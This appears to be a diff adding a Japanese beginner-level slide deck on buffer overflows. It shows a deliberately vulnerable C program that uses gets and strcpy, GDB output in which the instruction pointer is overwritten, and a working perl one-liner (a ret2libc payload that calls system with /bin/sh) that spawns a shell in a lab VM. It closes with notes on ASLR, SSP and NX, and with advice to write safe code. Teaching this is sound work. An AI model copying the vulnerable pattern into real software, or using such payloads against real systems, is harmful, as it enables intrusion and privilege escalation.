@@ -1,0 +1,279 @@
+<section>
+
+<h2>バッファオーバーフローについて</h2>
+<p>m-inada</p>
+
+<p>2017/05/19</p>
+
+<aside class="notes">
+
+<p>s キーで発表者用ノートを開ける<br>
+今日は、プログラミング初学者によく気をつけろと指導するバッファオーバーフローについて、<br>
+実際にどういう危険があるのか、というところをお話ししたいと思います。</p>
+
+</aside>
+
+</section>
+<section>
+
+<h3>バッファオーバーフローとは</h3>
+<ul>
+  <li>プログラム上で確保された領域 (バッファ) を超えてアクセスすること</li>
+  <li>
+    <p>バグを含んだプログラムの例</p>
+
+    <pre><code>#include&lt;stdio.h&gt;
+  
+#define LEN 32
+  
+char buffer[LEN];
+  
+int main(void) {
+    char hoge[LEN];
+  
+    gets(hoge);
+    strcpy(buffer, hoge);
+  
+    puts(buffer);
+  
+    return 0;
+}
+</code></pre>
+  </li>
+</ul>
+
+<aside class="notes">
+
+<p>ありがちなバッファオーバーフローのプログラムです。</p>
+
+</aside>
+
+</section>
+<section>
+
+<h3>実行結果1</h3>
+<ul>
+  <li>入力された文字を返すだけ</li>
+</ul>
+
+<pre><code>vagrant@vagrant-ubuntu-precise-32:~/work$ ./a.out
+hogehoge
+hogehoge
+</code></pre>
+
+<aside class="notes">
+
+<p>入力された文字を返すだけの簡単な動作です。</p>
+
+</aside>
+
+</section>
+<section>
+
+<ul>
+  <li>確保された文字数以上を入力するとどうなる?</li>
+</ul>
+
+</section>
+<section>
+
+<h3>実行結果2</h3>
+
+<pre><code>vagrant@vagrant-ubuntu-precise-32:~/work$ ./a.out
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+</code></pre>
+
+</section>
+<section>
+
+<p>＿人人人人人人人人人人人＿<br>
+＞　Segmentation fault　＜<br>
+￣Y^Y^Y^Y^Y^Y^Y^Y^Y^Y^Y^￣</p>
+
+</section>
+<section>
+
+<ul>
+  <li>
+    <s>よく見るやつ</s>
+  </li>
+  <li>メモリ内で許可されていない領域を読み込んだりすると落ちる
+    <ul>
+      <li>初期化されていないポインタにアクセスしたりなど</li>
+    </ul>
+  </li>
+</ul>
+
+<aside class="notes">
+
+<p>Segmentation fault が起きます。<br>
+これ自体主にプログラミング初学者が頭を悩ませる問題だったりするのですが…。</p>
+
+</aside>
+
+</section>
+<section>
+
+<h3>GDB で動きを見てみる</h3>
+<pre><code>vagrant@vagrant-ubuntu-precise-32:~/work/bof$ gdb -q a.out
+Reading symbols from /home/vagrant/work/bof/a.out...(no debugging symbols found)...done.
+gdb-peda$ run
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0
+EBX: 0xb7fd0ff4 --&gt; 0x1a7d7c
+ECX: 0xffffffff
+EDX: 0xb7fd28b8 --&gt; 0x0
+ESI: 0x0
+EDI: 0x0
+EBP: 0x41414141 ('AAAA')
+ESP: 0xbffff730 ("AAAAAA")
+EIP: 0x41414141 ('AAAA')
+EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41414141
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff730 ("AAAAAA")
+0004| 0xbffff734 --&gt; 0xbf004141
+0008| 0xbffff738 --&gt; 0xbffff7cc --&gt; 0xbffff908 ("SHELL=/bin/bash")
+0012| 0xbffff73c --&gt; 0xb7fdc858 --&gt; 0xb7e29000 --&gt; 0x464c457f
+0016| 0xbffff740 --&gt; 0x0
+0020| 0xbffff744 --&gt; 0xbffff71c ('A' &lt;repeats 26 times&gt;)
+0024| 0xbffff748 --&gt; 0xbffff7cc --&gt; 0xbffff908 ("SHELL=/bin/bash")
+0028| 0xbffff74c --&gt; 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+</code></pre>
+
+</section>
+<section>
+
+<ul>
+  <li>インストラクションポインタが上書きされている
+    <ul>
+      <li>ここに実行させたい関数のアドレスを書き込めれば色々できそう</li>
+    </ul>
+  </li>
+</ul>
+
+</section>
+<section>
+
+<h3>インストラクションポインタにアドレスを書き込んでみる</h3>
+<ul>
+  <li>プログラム内で定義されているが、main 関数からは呼ばれない fuga 関数を呼んでみる</li>
+</ul>
+
+</section>
+<section>
+
+<h3>悪用されると何ができてしまう?</h3>
+<ul>
+  <li>シェルを奪えます
+    <ul>
+      <li>root 権限を奪える (権限昇格できる) と、何でもやり放題</li>
+    </ul>
+  </li>
+</ul>
+
+</section>
+<section>
+
+<pre><code>vagrant@vagrant-ubuntu-precise-32:~/work/bof$ (perl -e 'print "/bin/sh #" . "A"x35 . "\xb0\x80\xe6\xb7" . "BBBB" . "\x40\xa0\x04\x08"'; cat) | ./a.out
+
+/bin/sh #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBB@
+pwd
+/home/vagrant/work/bof
+ls
+a.out  core  test.c
+</code></pre>
+
+</section>
+<section>
+
+<h3>行われたこと</h3>
+<ul>
+  <li>hoge という文字列変数に大量の文字を書き込み、周辺のメモリを書き換え
+    <ul>
+      <li>スタック内に保存されたリターンアドレスを system 関数のアドレスに書き換え</li>
+      <li>system 関数に “/bin/sh #….” という引数を与えるためにスタック内を書き換え</li>
+    </ul>
+  </li>
+  <li>結果として、main 関数を return した際に system 関数によって /bin/sh が起動された</li>
+</ul>
+
+</section>
+<section>
+
+<ul>
+  <li>実際はこんなに単純ではない
+    <ul>
+      <li>各種の防御機構が働いている
+        <ul>
+          <li>ASLR (Address Space Layout Randomization)</li>
+          <li>SSP (Stack Smash Protection)</li>
+          <li>NX bit (No eXecute bit)</li>
+          <li>etc…</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>これらの仕組みをくぐり抜けて攻撃する手段も研究されている (いたちごっこ)
+    <ul>
+      <li>ROP (Return Oriented Programming)</li>
+      <li>特殊な条件が揃えば攻撃可能となる</li>
+    </ul>
+  </li>
+</ul>
+
+<aside class="notes">
+
+<p>ASLR  : メモリ配置をランダム化するため、実行ごとにアドレスが変わる<br>
+SSP   : スタックが書き換えられていることを検知して強制終了する<br>
+NX bit: メモリ上のデータのうち、必要のない部分を実行不可にする</p>
+
+</aside>
+
+</section>
+<section>
+
+<h3>まとめ</h3>
+<ul>
+  <li>バッファオーバーフローが起きるプログラムは脆弱
+    <ul>
+      <li>ネットワークを介してユーザの入力を受け付けているプログラムは最悪リモートでシェルを奪われる可能性がある</li>
+    </ul>
+  </li>
+  <li>防御機構を過信せず、安全なプログラムを書きましょう</li>
+</ul>
+
+<!--
+  disable uppercase
+  via. http://srz-zumix.blogspot.jp/2014/09/revealjs-markdown.html
+-->
+<style type="text/css">
+    .reveal h1,
+    .reveal h2,
+    .reveal h3,
+    .reveal h4,
+    .reveal h5,
+    .reveal h6 {
+      text-transform: none;
+    }
+</style>
+
+<!--
+<span style="color:red">red text</span>
+<span style="font-size:small">small text</span>
+<span style="font-size:normal; float: left">[2] [GitHub - jedcn/reveal-ck](<a href="https://github.com/jedcn/reveal-ck">https://github.com/jedcn/reveal-ck</a>)</span>
+<span style="font-size:normal; float: left">[3] [GitHub - hakimel/reveal.js](<a href="https://github.com/hakimel/reveal.js/">https://github.com/hakimel/reveal.js/</a>)</span>
+-->
+
+</section>
